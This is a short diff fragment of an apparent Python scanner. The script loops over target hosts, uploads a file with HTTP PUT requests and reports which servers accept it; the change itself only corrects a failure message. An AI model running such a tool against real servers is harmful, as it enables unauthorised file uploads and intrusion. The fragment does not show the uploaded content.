@@ -37,7 +37,7 @@ while True:
  try:
     r = requests.request('put', host + outname, data=scheker, headers={'Content-Type':'application/octet-stream'})
  except:
-    print('\033[31;1m[-]\033[0m Vuln Cuks        : Null Respone\n')
+    print('\033[31;1m[-]\033[0m Not Vuln Cuks        : Null Respone\n')
     pass
     continue
  if r.status_code == 200:
